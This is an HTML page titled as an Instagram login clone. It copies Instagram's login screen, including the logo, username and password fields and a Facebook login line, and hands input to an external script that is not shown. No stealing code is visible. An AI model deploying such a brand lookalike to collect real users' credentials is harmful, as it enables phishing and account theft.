<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login Clone</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      box-sizing: border-box;
    }
    body {
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 350px;
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      text-align: center;
    }
    .logo {
      width: 175px;
      margin: 0 auto 30px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #0095f6;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      margin-top: 10px;
      cursor: pointer;
    }
    .divider {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
    }
    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }
    .divider:not(:empty)::before {
      margin-right: .25em;
    }
    .divider:not(:empty)::after {
      margin-left: .25em;
    }
    .bottom {
      margin-top: 20px;
      font-size: 14px;
    }
    .bottom a {
      color: #00376b;
      text-decoration: none;
      font-weight: 600;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
    <input id="username" type="text" placeholder="Phone number, username, or email" />
    <input id="password" type="password" placeholder="Password" />
    <button id="loginButton">Log In</button>
    <div class="divider">OR</div>
    <div style="color: #385185; font-weight: bold; margin-bottom: 20px; cursor: pointer;">
      Log in with Facebook
    </div>
    <div style="font-size: 12px; color: #8e8e8e; cursor: pointer;">Forgot password?</div>
    <div class="bottom">
      Don't have an account? <a href="#">Sign up</a>
    </div>
  </div>

  <!-- Your main script as module -->
  <script type="module" src="./script.js"></script>
</body>
</html>
